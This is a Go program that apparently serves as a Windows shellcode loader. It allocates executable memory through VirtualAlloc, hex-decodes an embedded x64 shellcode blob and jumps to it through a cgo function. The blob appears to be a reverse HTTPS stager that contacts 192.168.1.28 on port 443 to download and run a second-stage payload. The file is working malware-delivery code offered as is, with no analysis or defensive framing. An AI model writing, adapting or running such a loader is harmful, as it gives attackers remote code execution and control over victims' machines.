package main

/*
#include <stdio.h>
#include <string.h>
#include <unistd.h>
void execute(unsigned char *ptr, char *shellcode, size_t length) {

  memcpy(ptr, shellcode, length);
  (*(void(*)())ptr)();
}
*/
import "C"
import (
	"encoding/hex"
	"fmt"
	"os"
	"syscall"
	"unsafe"
)

const (
	MEM_COMMIT             = 0x1000
	MEM_RESERVE            = 0x2000
	PAGE_EXECUTE_READWRITE = 0x40
)

var (
	kernel32     = syscall.MustLoadDLL("kernel32.dll")
	VirtualAlloc = kernel32.MustFindProc("VirtualAlloc")
)

func main() {
	//fun := func() {}
	shelly, err := hex.DecodeString("fc4883e4f0e8cc000000415141505251564831d265488b5260488b5218488b5220488b7250480fb74a4a4d31c94831c0ac3c617c022c2041c1c90d4101c1e2ed524151488b52208b423c4801d0668178180b020f85720000008b80880000004885c074674801d0508b4818448b40204901d0e35648ffc9418b34884801d64d31c94831c0ac41c1c90d4101c138e075f14c034c24084539d175d858448b40244901d066418b0c48448b401c4901d0418b04884801d0415841585e595a41584159415a4883ec204152ffe05841595a488b12e94bffffff5d4831db5349be77696e696e65740041564889e149c7c24c772607ffd553534889e1535a4d31c04d31c9535349ba3a5679a700000000ffd5e80d0000003139322e3136382e312e3238005a4889c149c7c0bb0100004d31c953536a035349ba57899fc600000000ffd5e8880000002f6f47426a6d622d486151465372564f7644423744477769316d5f58697230585951474e3653474f506a5a76706a773935546e7732637937354d59666e6d736f464966415a6658616c4e54783266595241396470753944456a757a476f6f6d546b6d3063716a53386d6d666659307542544a49766f544c542d5a6b69777a4c785234345a446d53004889c1535a41584d31c95348b80032a0840000000050535349c7c2eb552e3bffd54889c66a0a5f4889f16a1f5a5268803300004989e06a04415949ba75469e8600000000ffd54d31c0535a4889f14d31c94d31c9535349c7c22d06187bffd585c0751f48c7c18813000049ba44f035e000000000ffd548ffcf7402ebaae85500000053596a405a4989d1c1e21049c7c00010000049ba58a453e500000000ffd5489353534889e74889f14889da49c7c0002000004989f949ba129689e200000000ffd54883c42085c074b2668b074801c385c075d258c3586a005949c7c2f0b5a256ffd5")
	if err != nil {
		fmt.Printf("Error with hex decoding: %s\n", err)
		os.Exit(1)
	}
	shell := []byte(shelly)
	addr, _, err := VirtualAlloc.Call(0, unsafe.Sizeof(shell), MEM_COMMIT, PAGE_EXECUTE_READWRITE)
	C.execute((*C.uchar)(unsafe.Pointer(addr)), (*C.char)(unsafe.Pointer(&shell[0])), (C.size_t)(len(shell)))
	//**(**uintptr)(unsafe.Pointer(&fun)) = *(*uintptr)(unsafe.Pointer(&addr))
	//fun()
}
